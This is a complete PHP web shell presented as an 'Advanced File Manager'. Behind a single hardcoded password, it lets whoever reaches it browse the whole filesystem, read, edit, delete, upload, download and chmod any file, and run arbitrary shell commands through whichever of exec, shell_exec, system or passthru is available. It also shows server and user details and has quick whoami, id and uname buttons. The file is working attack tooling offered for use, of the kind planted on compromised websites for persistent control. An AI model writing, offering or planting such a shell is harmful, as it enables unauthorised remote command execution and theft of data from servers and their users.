<?php
// Security: Simple authentication
session_start();
$PASSWORD = 'your_strong_password_here'; // Bunu dəyişdir!

if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['password']) && $_POST['password'] === $PASSWORD) {
        $_SESSION['authenticated'] = true;
    } else {
        ?>
        <!DOCTYPE html>
        <html>
        <head><title>Authentication</title>
        <style>
            body { background: #121212; color: #e0e0e0; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; }
            input { padding: 10px; margin: 10px; border-radius: 5px; border: none; }
            button { padding: 10px 20px; background: #8f0000; color: white; border: none; border-radius: 5px; cursor: pointer; }
        </style>
        </head>
        <body>
            <form method="POST">
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
        </body>
        </html>
        <?php
        exit;
    }
}

// Safe path validation
function validatePath($path) {
    $realPath = realpath($path);
    return $realPath !== false ? $realPath : $path;
}

// Fayl və qovluqların siyahısı
function getFiles($path) {
    $path = validatePath($path);
    if (!is_dir($path)) return [];
    
    $files = @scandir($path);
    if ($files === false) return [];
    
    $fileList = [];
    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $filePath = $path . DIRECTORY_SEPARATOR . $file;
            $fileInfo = [
                'name' => $file,
                'path' => $filePath,
                'type' => is_dir($filePath) ? 'dir' : 'file',
                'size' => is_file($filePath) ? filesize($filePath) : 0,
                'perms' => substr(sprintf('%o', fileperms($filePath)), -4),
                'modified' => date('Y-m-d H:i:s', filemtime($filePath)),
                'owner' => function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($filePath))['name'] : fileowner($filePath),
            ];
            $fileList[] = $fileInfo;
        }
    }
    return $fileList;
}

// File operations
function deleteFile($path) {
    $path = validatePath($path);
    if (is_file($path)) return @unlink($path);
    if (is_dir($path)) {
        $files = array_diff(scandir($path), ['.', '..']);
        foreach ($files as $file) {
            deleteFile($path . DIRECTORY_SEPARATOR . $file);
        }
        return @rmdir($path);
    }
    return false;
}

function renameFile($old, $new) {
    return @rename(validatePath($old), $new);
}

function createFile($path, $filename) {
    $filePath = validatePath($path) . DIRECTORY_SEPARATOR . $filename;
    return @touch($filePath);
}

function createDirectory($path, $dirname) {
    $dirPath = validatePath($path) . DIRECTORY_SEPARATOR . $dirname;
    return @mkdir($dirPath, 0755, true);
}

function editFile($filePath, $content) {
    return @file_put_contents(validatePath($filePath), $content);
}

function readFile($filePath) {
    $path = validatePath($filePath);
    return is_file($path) ? @file_get_contents($path) : false;
}

function changePermissions($filePath, $perms) {
    return @chmod(validatePath($filePath), octdec($perms));
}

function uploadFile($path, $file) {
    $uploadPath = validatePath($path) . DIRECTORY_SEPARATOR . basename($file['name']);
    return @move_uploaded_file($file['tmp_name'], $uploadPath);
}

function executeCommand($cmd) {
    $output = '';
    if (function_exists('exec')) {
        @exec($cmd . ' 2>&1', $output);
        return implode("\n", $output);
    } elseif (function_exists('shell_exec')) {
        return @shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('system')) {
        ob_start();
        @system($cmd . ' 2>&1');
        return ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        @passthru($cmd . ' 2>&1');
        return ob_get_clean();
    }
    return 'Command execution disabled';
}

// AJAX handlers
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';
    $path = $_POST['path'] ?? getcwd();
    
    header('Content-Type: application/json');
    
    switch ($action) {
        case 'getFiles':
            echo json_encode(getFiles($path));
            exit;
            
        case 'delete':
            $result = deleteFile($_POST['deletePath'] ?? '');
            echo json_encode(['success' => $result, 'message' => $result ? 'Deleted' : 'Failed']);
            exit;
            
        case 'rename':
            $result = renameFile($_POST['oldPath'] ?? '', $_POST['newPath'] ?? '');
            echo json_encode(['success' => $result, 'message' => $result ? 'Renamed' : 'Failed']);
            exit;
            
        case 'createFile':
            $result = createFile($path, $_POST['filename'] ?? '');
            echo json_encode(['success' => $result, 'message' => $result ? 'Created' : 'Failed']);
            exit;
            
        case 'createDirectory':
            $result = createDirectory($path, $_POST['dirname'] ?? '');
            echo json_encode(['success' => $result, 'message' => $result ? 'Created' : 'Failed']);
            exit;
            
        case 'editFile':
            $result = editFile($_POST['filePath'] ?? '', $_POST['content'] ?? '');
            echo json_encode(['success' => $result, 'message' => $result ? 'Saved' : 'Failed']);
            exit;
            
        case 'readFile':
            $content = readFile($_POST['filePath'] ?? '');
            echo json_encode(['success' => $content !== false, 'content' => $content]);
            exit;
            
        case 'chmod':
            $result = changePermissions($_POST['filePath'] ?? '', $_POST['perms'] ?? '0644');
            echo json_encode(['success' => $result, 'message' => $result ? 'Changed' : 'Failed']);
            exit;
            
        case 'upload':
            if (isset($_FILES['file'])) {
                $result = uploadFile($path, $_FILES['file']);
                echo json_encode(['success' => $result, 'message' => $result ? 'Uploaded' : 'Failed']);
            }
            exit;
            
        case 'execute':
            $output = executeCommand($_POST['cmd'] ?? '');
            echo json_encode(['output' => $output]);
            exit;
            
        case 'download':
            $filePath = validatePath($_POST['filePath'] ?? '');
            if (is_file($filePath)) {
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
                header('Content-Length: ' . filesize($filePath));
                readfile($filePath);
            }
            exit;
    }
}

$initialPath = validatePath($_GET['path'] ?? getcwd());
?>
<!DOCTYPE html>
<html>
<head>
    <title>Advanced File Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #121212;
            color: #e0e0e0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { color: #fdd835; margin-bottom: 20px; text-align: center; }
        .breadcrumb {
            background: #1e1e1e;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            flex-wrap: wrap;
        }
        .breadcrumb a {
            color: #64b5f6;
            text-decoration: none;
            margin-right: 10px;
            padding: 5px 10px;
            border-radius: 5px;
            transition: background 0.3s;
        }
        .breadcrumb a:hover { background: #333; }
        
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .tab {
            background: #1e1e1e;
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
            transition: background 0.3s;
        }
        .tab:hover, .tab.active { background: #8f0000; }
        
        .content { display: none; }
        .content.active { display: block; }
        
        .file-list {
            list-style: none;
            background: #1e1e1e;
            border-radius: 10px;
            padding: 10px;
            max-height: 600px;
            overflow-y: auto;
        }
        .file-item {
            display: flex;
            align-items: center;
            padding: 12px;
            margin: 5px 0;
            background: #2a2a2a;
            border-radius: 8px;
            transition: background 0.3s;
            cursor: pointer;
        }
        .file-item:hover { background: #333; }
        .file-icon { width: 30px; height: 30px; margin-right: 15px; }
        .file-info { flex: 1; }
        .file-name { font-weight: bold; display: block; }
        .file-meta { font-size: 12px; color: #999; }
        .file-actions {
            display: flex;
            gap: 5px;
        }
        .btn {
            background: #8f0000;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            transition: background 0.3s;
        }
        .btn:hover { background: #b00000; }
        .btn-secondary { background: #424242; }
        .btn-secondary:hover { background: #616161; }
        
        .form-group {
            background: #1e1e1e;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
        }
        .form-group input,
        .form-group textarea,
        .form-group select {
            width: 100%;
            padding: 10px;
            background: #2a2a2a;
            border: 1px solid #444;
            border-radius: 5px;
            color: #e0e0e0;
            margin-bottom: 10px;
        }
        .form-group textarea { min-height: 200px; font-family: monospace; }
        
        .terminal {
            background: #000;
            color: #0f0;
            padding: 15px;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            min-height: 300px;
            overflow-y: auto;
        }
        .terminal-input {
            display: flex;
            margin-top: 10px;
        }
        .terminal-input input {
            flex: 1;
            background: #222;
            border: 1px solid #444;
            padding: 10px;
            color: #0f0;
            font-family: 'Courier New', monospace;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active { display: flex; }
        .modal-content {
            background: #1e1e1e;
            padding: 30px;
            border-radius: 10px;
            max-width: 800px;
            width: 90%;
            max-height: 80vh;
            overflow-y: auto;
        }
        .modal-close {
            float: right;
            font-size: 28px;
            cursor: pointer;
            color: #999;
        }
        .modal-close:hover { color: #fff; }
        
        .info-box {
            background: #1e1e1e;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 15px;
        }
        .info-box strong { color: #fdd835; }
        
        @media (max-width: 768px) {
            .file-item { flex-direction: column; align-items: flex-start; }
            .file-actions { margin-top: 10px; width: 100%; }
            .tabs { flex-direction: column; }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>🔥 Advanced File Manager 🔥</h1>
    
    <div class="info-box">
        <strong>System Info:</strong> 
        OS: <?php echo PHP_OS; ?> | 
        PHP: <?php echo PHP_VERSION; ?> | 
        Server: <?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'; ?> |
        User: <?php echo get_current_user(); ?> (UID: <?php echo getmyuid(); ?>)
    </div>
    
    <div class="breadcrumb" id="breadcrumb"></div>
    
    <div class="tabs">
        <div class="tab active" onclick="switchTab('files')">📁 Files</div>
        <div class="tab" onclick="switchTab('upload')">⬆️ Upload</div>
        <div class="tab" onclick="switchTab('editor')">📝 Editor</div>
        <div class="tab" onclick="switchTab('terminal')">💻 Terminal</div>
        <div class="tab" onclick="switchTab('tools')">🛠️ Tools</div>
    </div>
    
    <div id="files-content" class="content active">
        <ul class="file-list" id="fileList"></ul>
    </div>
    
    <div id="upload-content" class="content">
        <div class="form-group">
            <label>Upload File</label>
            <input type="file" id="uploadFile">
            <button class="btn" onclick="uploadFile()">Upload</button>
        </div>
    </div>
    
    <div id="editor-content" class="content">
        <div class="form-group">
            <label>File Path</label>
            <input type="text" id="editorPath" placeholder="/path/to/file.txt">
            <button class="btn btn-secondary" onclick="loadFileContent()">Load</button>
            <button class="btn" onclick="saveFileContent()">Save</button>
        </div>
        <div class="form-group">
            <label>Content</label>
            <textarea id="editorContent"></textarea>
        </div>
    </div>
    
    <div id="terminal-content" class="content">
        <div class="terminal" id="terminalOutput">$ Welcome to terminal</div>
        <div class="terminal-input">
            <span style="color: #0f0;">$</span>
            <input type="text" id="terminalInput" placeholder="Enter command..." onkeypress="if(event.key==='Enter')executeCmd()">
            <button class="btn" onclick="executeCmd()">Execute</button>
        </div>
    </div>
    
    <div id="tools-content" class="content">
        <div class="form-group">
            <h3>Quick Actions</h3>
            <button class="btn" onclick="createNewFile()">New File</button>
            <button class="btn" onclick="createNewDir()">New Directory</button>
            <button class="btn btn-secondary" onclick="location.href='?action=logout'">Logout</button>
        </div>
        <div class="form-group">
            <h3>System Commands</h3>
            <button class="btn btn-secondary" onclick="quickCmd('whoami')">whoami</button>
            <button class="btn btn-secondary" onclick="quickCmd('pwd')">pwd</button>
            <button class="btn btn-secondary" onclick="quickCmd('id')">id</button>
            <button class="btn btn-secondary" onclick="quickCmd('uname -a')">uname</button>
        </div>
    </div>
</div>

<div class="modal" id="fileModal">
    <div class="modal-content">
        <span class="modal-close" onclick="closeModal()">&times;</span>
        <div id="modalContent"></div>
    </div>
</div>

<script>
let currentPath = '<?php echo addslashes($initialPath); ?>';

function switchTab(tab) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
    event.target.classList.add('active');
    document.getElementById(tab + '-content').classList.add('active');
}

function loadFiles(path) {
    currentPath = path || currentPath;
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `action=getFiles&path=${encodeURIComponent(currentPath)}`
    })
    .then(r => r.json())
    .then(files => {
        const list = document.getElementById('fileList');
        list.innerHTML = '';
        
        // Breadcrumb
        const parts = currentPath.split('/').filter(p => p);
        let breadcrumb = '<a href="#" onclick="loadFiles(\'/\'); return false;">/</a>';
        let path = '';
        parts.forEach(p => {
            path += '/' + p;
            breadcrumb += `<a href="#" onclick="loadFiles('${path}'); return false;">${p}</a>`;
        });
        document.getElementById('breadcrumb').innerHTML = breadcrumb;
        
        // Parent directory
        if (currentPath !== '/') {
            const parentPath = currentPath.split('/').slice(0, -1).join('/') || '/';
            list.innerHTML += `
                <li class="file-item" onclick="loadFiles('${parentPath}')">
                    <img class="file-icon" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23fdd835' d='M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z'/%3E%3C/svg%3E">
                    <div class="file-info"><span class="file-name">..</span></div>
                </li>
            `;
        }
        
        files.forEach(file => {
            const icon = file.type === 'dir' ? 
                "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23fdd835' d='M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z'/%3E%3C/svg%3E" :
                "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2364b5f6' d='M6 2c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6H6zm7 7V3.5L18.5 9H13z'/%3E%3C/svg%3E";
            
            const onclick = file.type === 'dir' ? `loadFiles('${file.path}')` : `showFileActions('${file.path}', '${file.name}')`;
            
            list.innerHTML += `
                <li class="file-item" onclick="${onclick}">
                    <img class="file-icon" src="${icon}">
                    <div class="file-info">
                        <span class="file-name">${file.name}</span>
                        <div class="file-meta">
                            ${formatSize(file.size)} | ${file.perms} | ${file.owner} | ${file.modified}
                        </div>
                    </div>
                    <div class="file-actions" onclick="event.stopPropagation()">
                        ${file.type === 'file' ? `<button class="btn" onclick="downloadFile('${file.path}')">⬇️</button>` : ''}
                        <button class="btn" onclick="renameItem('${file.path}')">✏️</button>
                        <button class="btn" onclick="chmodItem('${file.path}')">🔒</button>
                        <button class="btn" onclick="deleteItem('${file.path}')">🗑️</button>
                    </div>
                </li>
            `;
        });
    });
}

function formatSize(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
}

function showFileActions(path, name) {
    document.getElementById('modalContent').innerHTML = `
        <h2>${name}</h2>
        <button class="btn" onclick="editFileModal('${path}')">Edit</button>
        <button class="btn" onclick="downloadFile('${path}')">Download</button>
        <button class="btn" onclick="chmodItem('${path}')">Chmod</button>
        <button class="btn" onclick="renameItem('${path}')">Rename</button>
        <button class="btn" onclick="deleteItem('${path}')">Delete</button>
    `;
    document.getElementById('fileModal').classList.add('active');
}

function closeModal() {
    document.getElementById('fileModal').classList.remove('active');
}

function deleteItem(path) {
    if (!confirm('Delete ' + path + '?')) return;
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `action=delete&deletePath=${encodeURIComponent(path)}`
    })
    .then(r => r.json())
    .then(data => {
        alert(data.message);
        loadFiles();
    });
}

function renameItem(path) {
    const newName = prompt('New name:', path);
    if (!newName) return;
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `action=rename&oldPath=${encodeURIComponent(path)}&newPath=${encodeURIComponent(newName)}`
    })
    .then(r => r.json())
    .then(data => {
        alert(data.message);
        loadFiles();
    });
}

function chmodItem(path) {
    const perms = prompt('Permissions (e.g., 0644):', '0644');
    if (!perms) return;
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `action=chmod&filePath=${encodeURIComponent(path)}&perms=${perms}`
    })
    .then(r => r.json())
    .then(data => {
        alert(data.message);
        loadFiles();
    });
}

function downloadFile(path) {
    const form = document.createElement('form');
    form.method = 'POST';
    form.innerHTML = `<input type="hidden" name="action" value="download"><input type="hidden" name="filePath" value="${path}">`;
    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
}

function uploadFile() {
    const file = document.getElementById('uploadFile').files[0];
    if (!file) return alert('Select a file!');
    
    const formData = new FormData();
    formData.append('action', 'upload');
    formData.append('path', currentPath);
    formData.append('file', file);
    
    fetch('', { method: 'POST', body: formData })
    .then(r => r.json())
    .then(data => {
        alert(data.message);
        loadFiles();
    });
}

function loadFileContent() {
    const path = document.getElementById('editorPath').value;
    if (!path) return;
    
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `action=readFile&filePath=${encodeURIComponent(path)}`
    })
    .then(r => r.json())
    .then(data => {
        if (data.success) {
            document.getElementById('editorContent').value = data.content;
        } else {
            alert('Failed to load file');
        }
    });
}

function saveFileContent() {
    const path = document.getElementById('editorPath').value;
    const content = document.getElementById('editorContent').value;
    if (!path) return alert('Enter file path!');
    
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `action=editFile&filePath=${encodeURIComponent(path)}&content=${encodeURIComponent(content)}`
    })
    .then(r => r.json())
    .then(data => alert(data.message));
}

function editFileModal(path) {
    document.getElementById('editorPath').value = path;
    switchTab('editor');
    loadFileContent();
    closeModal();
}

function executeCmd() {
    const cmd = document.getElementById('terminalInput').value;
    if (!cmd) return;
    
    const output = document.getElementById('terminalOutput');
    output.innerHTML += `\n$ ${cmd}\n`;
    
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `action=execute&cmd=${encodeURIComponent(cmd)}`
    })
    .then(r => r.json())
    .then(data => {
        output.innerHTML += data.output + '\n';
        output.scrollTop = output.scrollHeight;
    });
    
    document.getElementById('terminalInput').value = '';
}

function quickCmd(cmd) {
    switchTab('terminal');
    document.getElementById('terminalInput').value = cmd;
    executeCmd();
}

function createNewFile() {
    const name = prompt('File name:');
    if (!name) return;
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `action=createFile&path=${encodeURIComponent(currentPath)}&filename=${encodeURIComponent(name)}`
    })
    .then(r => r.json())
    .then(data => {
        alert(data.message);
        loadFiles();
    });
}

function createNewDir() {
    const name = prompt('Directory name:');
    if (!name) return;
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: `action=createDirectory&path=${encodeURIComponent(currentPath)}&dirname=${encodeURIComponent(name)}`
    })
    .then(r => r.json())
    .then(data => {
        alert(data.message);
        loadFiles();
    });
}

// Initial load
loadFiles();
</script>
</body>
</html>
